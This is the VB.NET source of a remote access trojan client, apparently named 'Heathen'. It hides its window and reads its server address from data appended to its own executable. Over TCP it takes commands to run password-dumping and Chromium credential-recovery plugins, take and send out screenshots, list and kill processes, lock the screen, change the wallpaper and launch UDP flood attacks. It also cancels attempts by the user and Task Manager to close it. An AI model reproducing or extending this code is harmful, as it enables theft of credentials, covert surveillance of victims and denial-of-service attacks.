Imports System.Collections.Concurrent
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Text
Imports System.Threading
Imports Microsoft.Win32

Public Class Form1
    Public unlock As String = "" 'Key for ScreenLocker
    Public Connecteddd As Boolean = False ' Try to connect
    Dim splitz As String = "||||SPLITTTT||||" 'String to build server
    Dim MonClient As TcpClient
    Dim id As String




    '' CHANGE WALLPAPER FCT
    Const param1 As Integer = 20
    Const param2 As Integer = &H1
    Const param3 As Integer = &H2

    Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer

    '' CHANGE WALLPAPER FCT




    Public ClearMyplug As Boolean = False


    ''UDP

    Public IP As String = ""
    Public UDPByte As Byte() = New Byte() {}

    ''UDP
    Private Sub LireLesMessages(ByVal Context As TaskScheduler, ByVal stream As NetworkStream) 'Lire les messages du serveur

        Try
            Dim Buffer(4096) As Byte
            While (True)
                Dim lu As Integer = stream.Read(Buffer, 0, Buffer.Length)
                If (lu > 0) Then
                    Dim Message As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                    Task.Factory.StartNew(Sub() NouveauMessage(Message, False), CancellationToken.None, TaskCreationOptions.None, Context)
                Else
                    Task.Factory.StartNew(Sub() NouveauMessage("Le serveur a fermé la connexion.", True), CancellationToken.None, TaskCreationOptions.None, Context)
                    Exit Sub
                End If

            End While
        Catch ex As Exception
            Exit Sub
        End Try

    End Sub
    Public Function Base64ToImage(ByVal base64String As String) As Image
        ' Convert Base64 String to byte[]
        Dim imageBytes As Byte() = Convert.FromBase64String(base64String)
        Dim ms As New MemoryStream(imageBytes, 0, imageBytes.Length)

        ' Convert byte[] to Image
        ms.Write(imageBytes, 0, imageBytes.Length)
        Dim ConvertedBase64Image As Image = Image.FromStream(ms, True)
        Return ConvertedBase64Image
    End Function
    Public Sub SetWallpapertoBackground(ByVal k As String)




        Dim lk As New Random

        Dim oooddd = lk.Next(10000, 99999)

        IO.File.WriteAllText("Image.txt", k)

        PictureBox1.Image = Base64ToImage(k)



        Dim hh As String = (IO.Path.GetTempPath + "\" + oooddd.ToString + ".png")
        PictureBox1.Image.Save(hh, ImageFormat.Png)


        SystemParametersInfo(param1, 0, hh, param2 Or param3)


        TextBox1.Text = String.Empty

    End Sub

    Public Sub TakeScreen(ByVal filename As String)
        Try
            Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
            Dim image As New Bitmap(primaryMonitorSize.Width, primaryMonitorSize.Height)
            Dim graphics As Graphics = Graphics.FromImage(image)
            Dim upperLeftSource As New Point(0, 0)
            Dim upperLeftDestination As New Point(0, 0)
            graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, primaryMonitorSize)
            graphics.Flush()
            image.Save(filename, ImageFormat.Png)

        Catch ex As Exception

        End Try
    End Sub

    Public Sub PWLOAD(ByVal byt As Byte(), ByVal type As String, ByVal methodl As String)
        Dim assemblytoload As Assembly = Assembly.Load(byt)

        Dim method As MethodInfo = assemblytoload.[GetType](type).GetMethod(methodl)
        Dim obj As Object = assemblytoload.CreateInstance(method.Name)

        Dim ks As String = CStr(method.Invoke(obj, Nothing)) + vbCrLf + "END PASSWORD"

        Dim buffer() As Byte = Encoding.UTF8.GetBytes(ks)
        MonClient.GetStream().Write(buffer, 0, buffer.Length)


        TextBox1.Text = String.Empty

    End Sub
    Public Sub UDP(ByVal E As Byte(), ByVal IPNEEDED As String)
        Dim assemblytoload As Assembly = Assembly.Load(E)


        Dim method As MethodInfo = assemblytoload.[GetType]("DDOS.Methods").GetMethod("WorkerThreadFORUDP")

        Dim obj As Object = assemblytoload.CreateInstance(method.Name)
        Dim k As Object = IPNEEDED

        method.Invoke(obj, New Object() {k})
    End Sub
    Public Sub MessageFromHost(ByVal h As String)
        MessageBox.Show(h, "Heathen", MessageBoxButtons.OK, MessageBoxIcon.Information)
        TextBox1.Text = String.Empty
    End Sub

    Public Sub GetAllTasks()

        Dim Ultitask As New StringBuilder



        Dim jk As Process() = Process.GetProcesses
        For Each h In jk
            Dim lvi As New ListViewItem(h.ProcessName) 'first column

            lvi.SubItems.Add(h.Id) 'column 2

            lvi.SubItems.Add(h.BasePriority) 'column 3 

            ListView1.Items.Add(lvi) 'add all in listview

        Next
        ListView1.Sorting = SortOrder.Ascending

        For Each h As ListViewItem In ListView1.Items

            Ultitask.AppendLine(h.Text & "////" & h.SubItems(1).Text & "////" & h.SubItems(2).Text)

        Next




        Ultitask.Append("ThisIISSTASK")


        Dim buffer() As Byte = Encoding.UTF8.GetBytes(Ultitask.ToString)
        MonClient.GetStream().Write(buffer, 0, buffer.Length)


        TextBox1.Text = String.Empty
    End Sub

    Public Sub KillThat(ByVal k As String)

        Dim jk As Process() = Process.GetProcesses
        For Each h In jk

            If h.ProcessName = k Then
                Try
                    h.Kill()

                Catch ex As Exception
                End Try
            End If
        Next

        TextBox1.Text = String.Empty
    End Sub
    Public Sub ScreenLock()

        Form2.Show()

        TextBox1.Text = String.Empty
    End Sub
    Private Sub NouveauMessage(ByVal message As String, ByVal Fermé As Boolean)
        TextBox1.AppendText(message)

        If TextBox1.Text.EndsWith("ThisIsPWPlugin") Then  ''PW1



            TextBox1.Text = TextBox1.Text.Replace("ThisIsPWPlugin", "")
            Dim o As Byte() = Convert.FromBase64String(TextBox1.Text)

            Task.Run(Sub() PWLOAD(o, "PW.SteelPassword", "Dump"))



        ElseIf TextBox1.Text.EndsWith("ThisPWPlugin2") Then  ''PW2




            Dim odd = TextBox1.Text.Replace("ThisPWPlugin2", "")
            Dim o As Byte() = Convert.FromBase64String(odd)

            Task.Run(Sub() PWLOAD(o, "Plugin.Browsers.Chromium.Chromium", "Recovery"))

        ElseIf TextBox1.Text.EndsWith("ITSTIMETOSLEEP") Then  ''DISCONNECT
            Dim o As String = MonClient.Client.LocalEndPoint.ToString
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")

            MonClient.GetStream().Write(buffer, 0, buffer.Length)


            Application.Exit()
        ElseIf TextBox1.Text.EndsWith("MESASADDSDSD") Then
            Dim kkj As String = TextBox1.Text.Replace("MESASADDSDSD", "")
            MessageFromHost(kkj)



        ElseIf TextBox1.Text.EndsWith("GETMYTASKS") Then  'TASKMANAGER

            GetAllTasks()

        ElseIf TextBox1.Text.EndsWith("@&&&SCR") Then  'ScreenLocker
            Dim op As String = TextBox1.Text.Replace("@&&&SCR", "")

            unlock = op

            ScreenLock()

        ElseIf TextBox1.Text.EndsWith("SetWallpaperGoodSir") Then  ''WALLPAPER

            Dim j As String = TextBox1.Text.Replace("SetWallpaperGoodSir", "")



            Task.Run(Sub() SetWallpapertoBackground(j))





        ElseIf TextBox1.Text.EndsWith("/ThisTaskIsToKill") Then   'TASK Killer
            Dim PrepareTask As String = TextBox1.Text.Replace("/ThisTaskIsToKill", "")

            Task.Run(Sub() KillThat(PrepareTask))


        ElseIf TextBox1.Text.EndsWith("ITSTIMETODDOSWITHUDP") Then  'UDP FLOOD

            Dim j As String() = Split(TextBox1.Text, "IPPPPPP")

            Dim op As String = j(1).Replace("ITSTIMETODDOSWITHUDP", "")

            ' plug & "IPPPPPP" & IP & "ITSTIMETODDOSWITHUDP"
            '  DDOS.Methods.Udp.WorkerThread
            'IPPPPPP104.18.61.3ITSTIMETODDOSWITHUDP

            IP = op

            UDPByte = Convert.FromBase64String(j(0))

            UDPTIMER.Start()



        ElseIf TextBox1.Text = "TakeAPhotooo561" Then  'SCREENSHOT

            Dim lk As New Random
            Dim oooddd = lk.Next(10000, 99999)
            TakeScreen(IO.Path.GetTempPath + "\" + oooddd.ToString + ".png")




            Dim data As String = Convert.ToBase64String(IO.File.ReadAllBytes(IO.Path.GetTempPath + "\" + oooddd.ToString + ".png")) + "ILoveScreenShppppt"
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(data)
            MonClient.GetStream().Write(buffer, 0, buffer.Length)

            IO.File.Delete(IO.Path.GetTempPath + "\" + oooddd.ToString + ".png")

            TextBox1.Text = String.Empty

            If (Fermé) Then
                ' Button1.Text = "Se connecter"
                MonClient.Close()
            End If


        End If
    End Sub


    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing




        If e.CloseReason = CloseReason.TaskManagerClosing Then
            '  e.Cancel = True 

            Dim o As String = MonClient.Client.LocalEndPoint.ToString
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")







            MonClient.GetStream().Write(buffer, 0, buffer.Length)
            e.Cancel = True

        ElseIf (e.CloseReason = CloseReason.UserClosing) Then
            Dim o As String = MonClient.Client.LocalEndPoint.ToString


            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")
            MonClient.GetStream().Write(buffer, 0, buffer.Length)

            e.Cancel = True



        ElseIf e.CloseReason = CloseReason.None Then
            Dim o As String = MonClient.Client.LocalEndPoint.ToString



            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")
            MonClient.GetStream().Write(buffer, 0, buffer.Length)

        End If


    End Sub
    Private Sub MyBBClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.Closing




        If e.CloseReason = CloseReason.TaskManagerClosing Then
            '  e.Cancel = True 

            Dim o As String = MonClient.Client.LocalEndPoint.ToString
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")







            MonClient.GetStream().Write(buffer, 0, buffer.Length)
            e.Cancel = True

        ElseIf (e.CloseReason = CloseReason.UserClosing) Then
            Dim o As String = MonClient.Client.LocalEndPoint.ToString


            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")
            MonClient.GetStream().Write(buffer, 0, buffer.Length)

            e.Cancel = True



        ElseIf e.CloseReason = CloseReason.None Then
            Dim o As String = MonClient.Client.LocalEndPoint.ToString



            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")
            MonClient.GetStream().Write(buffer, 0, buffer.Length)

        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Me.ShowInTaskbar = False
        Me.ShowIcon = False

        FileOpen(1, System.Windows.Forms.Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
        Dim data As String = Space(LOF(1))
        FileGet(1, data)
        FileClose(1)

        Dim options() As String

        options = Split(data, splitz)




        If options(3) = "true" Then
            Helpe.startp(options(4))


        End If


        Try 'Pour éviter les erreurs

            MonClient = New TcpClient()
            MonClient.Connect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))
            Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
            If MonClient.Connected = True Then

                ''

                Dim l As New Random
                id = l.Next(100000, 999999).ToString
                Dim k = id + "THISISMYID"
                Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
                MonClient.GetStream().Write(buffer, 0, buffer.Length)
                ''

            Else

                Timer1.Start()
            End If
            Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))


        Catch ex As Exception
            '  MessageBox.Show(ex.Message, "Erreur") 'Afficher l'erreur.
            Timer1.Start()
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        FileOpen(1, System.Windows.Forms.Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
        Dim data As String = Space(LOF(1))
        FileGet(1, data)
        FileClose(1)
        Dim options() As String

        options = Split(data, splitz)

        Try 'Pour éviter les erreurs


            Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
            If MonClient.Connected = False Then


                MonClient = New TcpClient()
                MonClient.Connect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))


                Dim l As New Random
                id = l.Next(100000, 999999).ToString
                Dim k = id + "THISISMYID"
                Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
                MonClient.GetStream().Write(buffer, 0, buffer.Length)

            Else
                Timer1.Stop()

            End If
            Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))


        Catch ex As Exception

        End Try


    End Sub

    Private Sub UDPTIMER_Tick(sender As Object, e As EventArgs) Handles UDPTIMER.Tick
        If ClearMyplug = False Then
            TextBox1.Text = String.Empty
            ClearMyplug = True
        End If
        Task.Run(Sub() UDP(UDPByte, IP))
        Task.Run(Sub() UDP(UDPByte, IP))
        Task.Run(Sub() UDP(UDPByte, IP))
    End Sub
End Class

